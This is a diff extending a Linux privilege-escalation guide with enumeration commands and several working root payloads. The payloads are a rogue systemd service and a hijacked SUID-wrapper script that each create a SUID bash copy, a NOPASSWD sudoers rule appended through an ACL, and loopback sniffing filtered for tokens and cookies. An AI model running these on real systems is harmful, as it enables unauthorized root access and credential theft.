@@ -506,6 +506,25 @@ If the script executed by root uses a **directory where you have full access**, 
 ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
 ```
 
+### Symlink validation and safer file handling
+
+When reviewing privileged scripts/binaries that read or write files by path, verify how links are handled:
+
+- `stat()` follows a symlink and returns metadata of the target.
+- `lstat()` returns metadata of the link itself.
+- `readlink -f` and `namei -l` help resolve the final target and show permissions of each path component.
+
+```bash
+readlink -f /path/to/link
+namei -l /path/to/link
+```
+
+For defenders/developers, safer patterns against symlink tricks include:
+
+- `O_EXCL` with `O_CREAT`: fail if the path already exists (blocks attacker pre-created links/files).
+- `openat()`: operate relative to a trusted directory file descriptor.
+- `mkstemp()`: create temporary files atomically with secure permissions.
+
 ### Custom-signed cron binaries with writable payloads
 Blue teams sometimes "sign" cron-driven binaries by dumping a custom ELF section and grepping for a vendor string before executing them as root. If that binary is group-writable (e.g., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) and you can leak the signing material, you can forge the section and hijack the cron task:
 
@@ -638,6 +657,35 @@ Sockets can be configured using `.socket` files.
 If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
 _Note that the system must be using that socket file configuration or the backdoor won't be executed_
 
+### Socket activation + writable unit path (create missing service)
+
+Another high-impact misconfiguration is:
+
+- a socket unit with `Accept=no` and `Service=<name>.service`
+- the referenced service unit is missing
+- an attacker can write into `/etc/systemd/system` (or another unit search path)
+
+In that case, the attacker can create `<name>.service`, then trigger traffic to the socket so systemd loads and executes the new service as root.
+
+Quick flow:
+
+```bash
+systemctl cat vuln.socket
+# [Socket]
+# Accept=no
+# Service=vuln.service
+```
+
+```bash
+cat >/etc/systemd/system/vuln.service <<'EOF'
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
+EOF
+nc -q0 127.0.0.1 9999
+/var/tmp/rootbash -p
+```
+
 ### Writable sockets
 
 If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.
@@ -671,7 +719,7 @@ socket-command-injection.md
 Note that there may be some **sockets listening for HTTP** requests (_I'm not talking about .socket files but the files acting as unix sockets_). You can check this with:
 
 ```bash
-curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
+curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
 ```
 
 If the socket **responds with an HTTP** request, then you can **communicate** with it and maybe **exploit some vulnerability**.
@@ -793,22 +841,76 @@ It's always interesting to enumerate the network and figure out the position of 
 cat /etc/hostname /etc/hosts /etc/resolv.conf
 dnsdomainname
 
+#NSS resolution order (hosts file vs DNS)
+grep -E '^(hosts|networks):' /etc/nsswitch.conf
+getent hosts localhost
+
 #Content of /etc/inetd.conf & /etc/xinetd.conf
 cat /etc/inetd.conf /etc/xinetd.conf
 
 #Interfaces
 cat /etc/networks
 (ifconfig || ip a)
+(ip -br addr || ip addr show)
+
+#Routes and policy routing (pivot paths)
+ip route
+ip -6 route
+ip rule
+ip route get 1.1.1.1
+
+#L2 neighbours
+(arp -e || arp -a || ip neigh)
 
 #Neighbours
 (arp -e || arp -a)
 (route || ip n)
 
+#L2 topology (VLANs/bridges/bonds)
+ip -d link
+bridge link 2>/dev/null
+
+#Network namespaces (hidden interfaces/routes in containers)
+ip netns list 2>/dev/null
+ls /var/run/netns/ 2>/dev/null
+nsenter --net=/proc/1/ns/net ip a 2>/dev/null
+
 #Iptables rules
 (timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)
 
+#nftables and firewall wrappers (modern hosts)
+sudo nft list ruleset 2>/dev/null
+sudo nft list ruleset -a 2>/dev/null
+sudo ufw status verbose 2>/dev/null
+sudo firewall-cmd --state 2>/dev/null
+sudo firewall-cmd --list-all 2>/dev/null
+
+#Forwarding / asymmetric routing / conntrack state
+sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
+sudo conntrack -L 2>/dev/null | head -n 20
+
 #Files used by network services
 lsof -i
+```
+
+### Outbound filtering quick triage
+
+If the host can run commands but callbacks fail, separate DNS, transport, proxy, and route filtering quickly:
+
+```bash
+# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
+dig +time=2 +tries=1 @1.1.1.1 google.com A
+dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A
+
+# Common outbound ports
+for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done
+
+# Route/path clue for 443 filtering
+sudo traceroute -T -p 443 example.org 2>/dev/null || true
+
+# Proxy-enforced environments and remote-DNS SOCKS testing
+env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
+curl --socks5-hostname <ip>:1080 https://ifconfig.me
 ```
 
 ### Open ports
@@ -818,7 +920,58 @@ Always check network services running on the machine that you weren't able to in
 ```bash
 (netstat -punta || ss --ntpu)
 (netstat -punta || ss --ntpu) | grep "127.0"
+ss -tulpn
+#Quick view of local bind addresses (great for hidden/isolated interfaces)
+ss -tulpn | awk '{print $5}' | sort -u
 ```
+
+Classify listeners by bind target:
+
+- `0.0.0.0` / `[::]`: exposed on all local interfaces.
+- `127.0.0.1` / `::1`: local-only (good tunnel/forward candidates).
+- Specific internal IPs (e.g. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): usually reachable only from internal segments.
+
+### Local-only service triage workflow
+
+When you compromise a host, services bound to `127.0.0.1` often become reachable for the first time from your shell. A quick local workflow is:
+
+```bash
+# 1) Find local listeners
+ss -tulnp
+
+# 2) Discover open localhost TCP ports
+nmap -Pn --open -p- 127.0.0.1
+
+# 3) Fingerprint only discovered ports
+nmap -Pn -sV -p <ports> 127.0.0.1
+
+# 4) Manually interact / banner grab
+nc 127.0.0.1 <port>
+printf 'HELP\r\n' | nc 127.0.0.1 <port>
+```
+
+### LinPEAS as a network scanner (network-only mode)
+
+Besides local PE checks, linPEAS can run as a focused network scanner. It uses available binaries in `$PATH` (typically `fping`, `ping`, `nc`, `ncat`) and does not install tooling.
+
+```bash
+# Auto-discover subnets + hosts + quick ports
+./linpeas.sh -t
+
+# Host discovery in CIDR
+./linpeas.sh -d 10.10.10.0/24
+
+# Host discovery + custom ports
+./linpeas.sh -d 10.10.10.0/24 -p 22,80,443
+
+# Scan one IP (default/common ports)
+./linpeas.sh -i 10.10.10.20
+
+# Scan one IP with selected ports
+./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
+```
+
+If you pass `-d`, `-p`, or `-i` without `-t`, linPEAS behaves as a pure network scanner (skipping the rest of privilege-escalation checks).
 
 ### Sniffing
 
@@ -826,6 +979,32 @@ Check if you can sniff traffic. If you can, you could be able to grab some crede
 
 ```
 timeout 1 tcpdump
+```
+
+Quick practical checks:
+
+```bash
+#Can I capture without full sudo?
+which dumpcap && getcap "$(which dumpcap)"
+
+#Find capture interfaces
+tcpdump -D
+ip -br addr
+```
+
+Loopback (`lo`) is especially valuable in post-exploitation because many internal-only services expose tokens/cookies/credentials there:
+
+```bash
+sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
+  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
+```
+
+Capture now, parse later:
+
+```bash
+sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
+tshark -r /tmp/capture.pcap -Y http.request \
+  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
 ```
 
 ## Users
@@ -844,11 +1023,14 @@ cat /etc/passwd | grep "sh$"
 #List superusers
 awk -F: '($3 == "0") {print}' /etc/passwd
 #Currently logged users
+who
 w
+#Only usernames
+users
 #Login history
 last | tail
 #Last log of each user
-lastlog
+lastlog2 2>/dev/null || lastlog
 
 #List all users and their groups
 for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
@@ -1101,6 +1283,36 @@ export -f /usr/sbin/service
 ```
 
 Then, when you call the suid binary, this function will be executed
+
+### Writable script executed by a SUID wrapper
+
+A common custom-app misconfiguration is a root-owned SUID binary wrapper that executes a script, while the script itself is writable by low-priv users.
+
+Typical pattern:
+
+```c
+int main(void) {
+    system("/bin/bash /usr/local/bin/backup.sh");
+}
+```
+
+If `/usr/local/bin/backup.sh` is writable, you can append payload commands and then execute the SUID wrapper:
+
+```bash
+echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
+/usr/local/bin/backup_wrap
+/var/tmp/rootbash -p
+```
+
+Quick checks:
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
+ls -l /usr/local/bin/backup.sh
+```
+
+This attack path is especially common in "maintenance"/"backup" wrappers shipped in `/usr/local/bin`.
 
 ### LD_PRELOAD & **LD_LIBRARY_PATH**
 
@@ -1453,6 +1665,25 @@ setfacl -b file.txt #Remove the ACL of the file
 getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
 ```
 
+### Hidden ACL backdoor on sudoers drop-ins
+
+A common misconfiguration is a root-owned file in `/etc/sudoers.d/` with mode `440` that still grants write access to a low-priv user via ACL.
+
+```bash
+ls -l /etc/sudoers.d/*
+getfacl /etc/sudoers.d/<file>
+```
+
+If you see something like `user:alice:rw-`, the user can append a sudo rule despite restrictive mode bits:
+
+```bash
+echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
+visudo -cf /etc/sudoers.d/<file>
+sudo -l
+```
+
+This is a high-impact ACL persistence/privesc path because it is easy to miss in `ls -l`-only reviews.
+
 ## Open shell sessions
 
 In **old versions** you may **hijack** some **shell** session of a different user (**root**).\
@@ -1465,6 +1696,9 @@ In **newest versions** you will be able to **connect** to screen sessions only o
 ```bash
 screen -ls
 screen -ls <username>/ # Show another user' screen sessions
+
+# Socket locations (some systems expose one as symlink of the other)
+ls /run/screen/ /var/run/screen/ 2>/dev/null
 ```
 
 ![](<../../images/image (141).png>)
@@ -1517,6 +1751,14 @@ This bug is caused when creating a new ssh key in those OS, as **only 32,768 var
 - **PasswordAuthentication:** Specifies whether password authentication is allowed. The default is `no`.
 - **PubkeyAuthentication:** Specifies whether public key authentication is allowed. The default is `yes`.
 - **PermitEmptyPasswords**: When password authentication is allowed, it specifies whether the server allows login to accounts with empty password strings. The default is `no`.
+
+### Login control files
+
+These files influence who can log in and how:
+
+- **`/etc/nologin`**: if present, blocks non-root logins and prints its message.
+- **`/etc/securetty`**: restricts where root can log in (TTY allowlist).
+- **`/etc/motd`**: post-login banner (can leak environment or maintenance details).
 
 ### PermitRootLogin
 
